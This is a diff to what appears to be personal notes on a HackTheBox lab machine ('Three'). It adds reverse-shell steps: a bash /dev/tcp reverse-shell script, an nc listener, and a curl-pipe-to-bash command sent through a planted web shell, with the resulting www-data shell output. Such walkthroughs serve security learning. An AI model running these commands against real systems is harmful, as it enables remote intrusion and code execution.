@@ -69,11 +69,29 @@ http://thetoppers.htb/shell.php?cmd=id
 ```
 
 #REVERSE SHELL
-start ncat listener on our local port:
+Create shell.sh on local machine with the following content:
 ```shell
-nc -nvlp 1337
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
 ```
 
+start ncat listener on our local port and python http server on the same shell.sh directory:
+```shell
+nc -nvlp 1337
+python3 -m http.server 8000
+```
+On web server open url http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.131:8000/shell.sh|bash
+
+Reverse shell opened on nc terminal:
+```shell
+$ nc -nvlp 1337
+Listening on 0.0.0.0 1337
+ls
+Connection received on 10.129.55.155 50192
+bash: cannot set terminal process group (1612): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@three:/var/www/html$
+```
 # Acronyms
 
 WinRM, is a Windows-native built-in remote management protocol. port: 5985
